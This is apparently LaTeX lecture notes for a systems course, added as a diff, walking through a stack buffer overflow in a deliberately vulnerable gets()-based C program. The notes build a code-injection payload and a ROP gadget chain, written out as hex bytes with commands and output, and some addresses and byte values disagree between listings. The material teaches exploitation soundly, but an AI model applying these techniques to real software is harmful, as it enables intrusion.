@@ -1,0 +1,347 @@
+\documentclass{article}
+\usepackage{amsmath}
+% \usepackage{cancel}
+\usepackage{fancyhdr}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage[procnames]{listings}
+\lstset{language=C, alsolanguage=[x86masm]Assembler, tabsize=4, upquote=true, basicstyle=\ttfamily}
+\usepackage{xcolor}
+\newcommand{\function}[1]{\textbf{\lstinline{#1}}}
+
+% \pagestyle{fancy}
+% \fancyfoot{}
+% \lfoot{\copyright\ Christopher A. Bohn}
+% %% (c) 2018-22
+% \rfoot{Page \thepage}
+
+\fancypagestyle{plain}{
+    \fancyhf{}
+    \lfoot{\copyright\ Christopher A. Bohn} % (c) 2018-22
+    \rfoot{Page \thepage}
+    \renewcommand{\headrulewidth}{0pt}
+    \renewcommand{\footrulewidth}{0pt}
+}
+\pagestyle{plain}
+
+\newcommand{\carry}{\scriptstyle 1}
+
+\begin{document}
+
+\title{Chapter 11a Worked Examples}
+\date{}
+\maketitle
+
+NOTE: The addresses of buffers, functions, and gadgets may be different when you compile than what's shown here -- so you probably should construct your own strings based on what you see after disassembly.
+
+Our victim (\textit{target.c}):
+
+\begin{lstlisting}[language=C, numbers=left]
+#include <stdio.h>
+#include <stdlib.h>
+
+char global_buffer[512] = {0};
+
+void kick_me() {
+    printf("This function exists only to provide ROP instructions.\n");
+    __asm__(
+            "addq %rsi, %rdi\n"
+            "ret\n"
+            "movl $15, %edi\n"
+            "ret\n"
+            "movq %rdi, %rax\n"
+            "nop\n"
+            "nop\n"
+            "ret\n"
+//            "movq $53, %rsi\n"
+            "movabsq $0x35c6c74800, %rbp\n"
+            "nop\n"
+            "ret\n"
+            );
+    printf("There really isn't any other point to it.\n");
+}
+
+void print_integer(int number) {
+    printf("The number is %d\n", number);
+//    exit(0);
+}
+
+void get_inputs() {
+    char local_buffer[24];
+//    printf("Let's put something in the global buffer at address %p: \n", global_buffer);
+//    fgets(global_buffer, 512, stdin);
+    printf("Now the local buffer at address %p: \n", local_buffer);
+    gets(local_buffer);
+    print_integer(231);
+}
+
+void bar() {
+    get_inputs();
+    printf("Back in bar.\n");
+}
+
+void foo() {
+    bar();
+    printf("Back in foo.\n");
+}
+
+int main() {
+    foo();
+    printf("Back in main.\n");
+    return 0;
+}
+\end{lstlisting}
+
+Compile: \\ \textit{gcc -Og -std=c99 -fno-stack-protector -Wa,-\hspace{1pt}-execstack -o target target.c}
+
+We'll get a warning because of \function{gets()}.
+
+The ``-fno-stack-protector'' argument makes sure that there isn't a stack canary, regardless of what this installation of gcc is configured to do.
+The \\ ``-Wa,-\hspace{1pt}-execstack'' instructs the assembler to configure the stack to allow executable code on the stack.
+(Both of these are obviously bad ideas.
+Also, as we'll see, we're not going to take advantage of not having executable code on the stack.)
+
+Run the program: \\
+\textit{./target} \\
+\texttt{Now the local buffer at address 0x7ffd613c9090: } {\footnotesize (You  may get a different address)} \\
+\textit{hello, world} \\
+\texttt{The number is 231 \\
+Back in bar. \\
+Back in foo. \\
+Back in main.}
+
+Let's take a look at how much space is actually allocated for that buffer. \\
+\textit{objdump -d target $|$ grep -A 11 get\_inputs} {\footnotesize (This will show the 11 lines after the beginning of the function and also after the call to the function)} \\
+\begin{lstlisting}[language={[x86masm]Assembler}]
+00000000004005ea <get_inputs>:
+  4005ea:       48 83 ec 28             sub    $0x28,%rsp
+  4005ee:       48 89 e6                mov    %rsp,%rsi
+  4005f1:       bf 90 07 40 00          mov    $0x400790,%edi
+  4005f6:       b8 00 00 00 00          mov    $0x0,%eax
+  4005fb:       e8 a0 fe ff ff          call   4004a0 <printf@plt>
+  400600:       48 89 e7                mov    %rsp,%rdi
+  400603:       e8 a8 fe ff ff          call   4004b0 <gets@plt>
+  400608:       bf e7 00 00 00          mov    $0xe7,%edi
+  40060d:       e8 be ff ff ff          call   4005d0 <print_integer>
+  400612:       48 83 c4 28             add    $0x28,%rsp
+  400616:       c3                      ret
+--
+  400620:       e8 c5 ff ff ff          call   4005ea <get_inputs>
+  400625:       bf c8 07 40 00          mov    $0x4007c8,%edi
+  40062a:       e8 61 fe ff ff          call   400490 <puts@plt>
+  40062f:       48 83 c4 08             add    $0x8,%rsp
+  400633:       c3                      ret
+
+0000000000400634 <foo>:
+  400634:       48 83 ec 08             sub    $0x8,%rsp
+  400638:       b8 00 00 00 00          mov    $0x0,%eax
+  40063d:       e8 d5 ff ff ff          call   400617 <bar>
+  400642:       bf d5 07 40 00          mov    $0x4007d5,%edi
+  400647:       e8 44 fe ff ff          call   400490 <puts@plt>
+\end{lstlisting}
+
+There are 0x28 bytes between the start of the buffer and the return address to \function{bar()}. Let's start constructing our exploit code.
+
+\begin{verbatim}
+/* 0x28 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* return address follows */
+\end{verbatim}
+
+Let's add $20+53$ and have \function{print_integer()} print that instead of 231.
+The assembly code we need is
+\begin{lstlisting}[language={[x86masm]Assembler}]
+movq $20, %rdi
+addq $53, %rdi
+ret
+\end{lstlisting}
+and we need to put the address of \function{print_integer()} as the ``return address'' for that \lstinline{ret} instruction.
+
+Place that assembly code in a file and then assemble it to get the necessary bytes: \\
+\textit{
+gcc -c injection-code.s
+objdump -d injection-code.o
+}
+\begin{lstlisting}[language={[x86masm]Assembler}]
+0:   48 c7 c7 14 00 00 00    mov    $0x14,%rdi
+7:   48 83 c7 35             add    $0x35,%rdi
+b:   c3                      ret
+\end{lstlisting}
+
+The target address is 0x400660: \\
+\textit{objdump -d target $|$ grep print\_integer}
+\begin{lstlisting}[language={[x86masm]Assembler}]
+0000000000400660 <print_integer>:
+  4006c7:       e8 94 ff ff ff          call   400660 <print_integer>
+\end{lstlisting}
+
+The last thing we need is the address where our code will be -- and our victim helpfully provided the buffer's address.
+
+\begin{verbatim}
+/* mov $0x14,%rdi */
+48 c7 c7 14 00 00 00
+/* add $0x35,%rdi */
+                     48
+83 c7 35
+/* ret */
+         c3
+/* padding */
+            00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* exploit code's address */
+90 90 3c 61 fd 7f 00 00   /* don't forget byte-reversal for little-endian */
+/* print_integer's address */
+c7 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
+\end{verbatim}
+
+Note: this will break the requirement for 16-byte stack alignment.
+
+There's a more significant problem, though... \\
+\textit{
+./hex2raw \textless\ injection-code.hex \textgreater\ injection-code.raw \\
+./target \textless\ injection-code.raw \\
+}
+\texttt{
+Now the local buffer at address 0x7fff9bf3e0d0: \\
+The number is 231 \\
+Back in bar. \\
+Back in foo. \\
+Back in main. \\
+}
+
+The buffer is at a different address than we expected!
+The reason is a randomized stack offset.
+This is something we generally can only turn off if we have root privileges.
+(In the lab, we use other trickery.)
+
+% Fortunately(?), our Linux server doesn't have the full address space randomized, so a global variable, such as \lstinline{global_buffer} will be at the same address every time.
+% Uncomment lines 32--33, recompile, and take another look at the disassembled code:
+% \textit{
+% gcc -Og -std=c99 -fno-stack-protector -Wa,--execstack -o target target.c \\
+% objdump -d target $|$ grep -B 2 fgets
+% }
+% \begin{lstlisting}[language={[x86masm]Assembler}]
+%   40052b:       e9 d0 ff ff ff          jmp    400500 <_init+0x20>
+%
+% 0000000000400530 <fgets@plt>:
+%   400530:       ff 25 f2 0a 20 00       jmp    *0x200af2(%rip)        # 601028 <fgets@GLIBC_2.2.5>
+% --
+%   400699:       be 00 02 00 00          mov    $0x200,%esi
+%   40069e:       bf 80 10 60 00          mov    $0x601080,%edi
+%   4006a3:       e8 88 fe ff ff          call   400530 <fgets@plt>
+% \end{lstlisting}
+%
+% The global buffer is at 0x601080.
+% What we're going to have to do here (but not in the lab) is use the global buffer for our exploit code and then overflow the local buffer to put in the return addresses.
+%
+%
+% \begin{verbatim}
+% /* mov $0x14,%rdi */
+% 48 c7 c7 14 00 00 00
+% /* add $0x35,%rdi */
+% 48 83 c7 35
+% /* ret */
+% c3
+% /* newline, to end the fgets call that uses global buffer */
+% 0a
+% /* gets uses the local buffer, and we'll overflow it */
+% 00 00 00 00 00 00 00 00
+% 00 00 00 00 00 00 00 00
+% 00 00 00 00 00 00 00 00
+% 00 00 00 00 00 00 00 00
+% 00 00 00 00 00 00 00 00
+% /* exploit code's address */
+% 80 10 60 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
+% /* print_integer's address */
+% 60 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
+% \end{verbatim}
+
+We'll now use return-oriented programming, which doesn't require an executable stack and isn't bothered by a variable stack offset. Fortunately(?), our Linux server doesn't have the full address space randomized.
+
+There are other ways to add the two numbers together than the instructions that we tried earlier, and this program is seeded with
+\begin{lstlisting}[language={[x86masm]Assembler}]
+movl $20, %edi
+movq $53, %rsi
+addq %rsi %rdi
+\end{lstlisting}
+
+We need to look for these instructions, followed by zero or more NOPs, followed by return. \\
+
+\textit{objdump -d target $|$ grep -A 19 kick\_me}
+\begin{lstlisting}[language={[x86masm]Assembler}]
+0000000000400597 <kick_me>:
+  400597:       48 83 ec 08             sub    $0x8,%rsp
+  40059b:       bf 28 07 40 00          mov    $0x400728,%edi
+  4005a0:       e8 eb fe ff ff          call   400490 <puts@plt>
+  4005a5:       48 01 f7                add    %rsi,%rdi
+  4005a8:       c3                      ret
+  4005a9:       bf 0f 00 00 00          mov    $0x14,%edi
+  4005ae:       c3                      ret
+  4005af:       48 89 f8                mov    %rdi,%rax
+  4005b2:       90                      nop
+  4005b3:       90                      nop
+  4005b4:       c3                      ret
+  4005b5:       48 bd 00 48 c7 c6 35    movabs $0x35c6c74800,%rbp
+  4005bc:       00 00 00
+  4005bf:       90                      nop
+  4005c0:       c3                      ret
+  4005c1:       bf 60 07 40 00          mov    $0x400760,%edi
+  4005c6:       e8 c5 fe ff ff          call   400490 <puts@plt>
+  4005cb:       48 83 c4 08             add    $0x8,%rsp
+  4005cf:       c3                      ret
+\end{lstlisting}
+
+\lstinline{movl $0x14, %edi} followed by \lstinline{ret} is at 0x4005a9.
+\lstinline{addq %rsi, %rdi} followed by \lstinline{ret} is at 0x4005a5.
+But where is \lstinline{movq $53, %rsi}?
+
+We can find out what the desired bytes are by using the assembler like we did when creating our code injection earlier, and the bytes we want are 48~c7~c6~35~00~00~00.
+
+Those bytes appear in the middle of another instruction!
+If we point the instruction pointer to 0x4005b8, we'll find \lstinline{movq $0x35, %rsi} followed by \lstinline{nop} and \lstinline{ret}.
+
+Let's create a string that overflows the buffer and then has ``return addresses'' for those gadgets, followed by \function{print_integer}'s address.
+
+\begin{verbatim}
+/* 0x28 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* gadget addresses follow */
+a9 05 40 00 00 00 00 00 /* movl $20, %edi */
+b8 05 40 00 00 00 00 00 /* movq $53, %rsi */
+a5 05 40 00 00 00 00 00 /* addq %rsi, %rdi */
+/* print_integer */
+d0 05 40 00 00 00 00 00
+\end{verbatim}
+
+\textit{
+./hex2raw \textless\ rop-attack.hex \textgreater\ rop-attack.raw \\
+./target \textless\ rop-attack.raw \\
+}
+\begin{verbatim}
+Now the local buffer at address 0x7ffd4a48ec60:
+The number is 231
+The number is 73
+The number is 231
+Now the local buffer at address 0x7ffd4a48ec88:
+The number is 231
+Back in bar.
+Back in foo.
+Back in main.
+Segmentation fault (core dumped)
+\end{verbatim}
+
+Well, at one point we had the sum of $20+53$ printed.
+
+I'm going to have to trace through the execution to figure out why it didn't go exactly as I wanted.
+
+\end{document}
